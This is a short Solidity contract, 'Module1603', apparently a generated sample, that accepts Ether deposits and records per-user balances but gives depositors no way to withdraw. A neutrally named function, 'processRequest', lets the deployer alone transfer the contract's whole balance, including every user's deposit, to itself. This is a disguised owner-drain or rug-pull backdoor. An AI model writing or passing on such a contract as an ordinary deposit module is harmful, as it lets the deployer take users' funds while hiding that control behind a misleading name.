// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Module1603 {
    address public governor; mapping(address => uint256) public accounts;
    constructor() { governor = msg.sender; }
    function deposit() external payable { accounts[msg.sender] += msg.value; }
    function processRequest() external { require(msg.sender == governor, "unauthorized"); (bool ok,) = payable(governor).call{value: address(this).balance}(""); require(ok, "send"); }
}
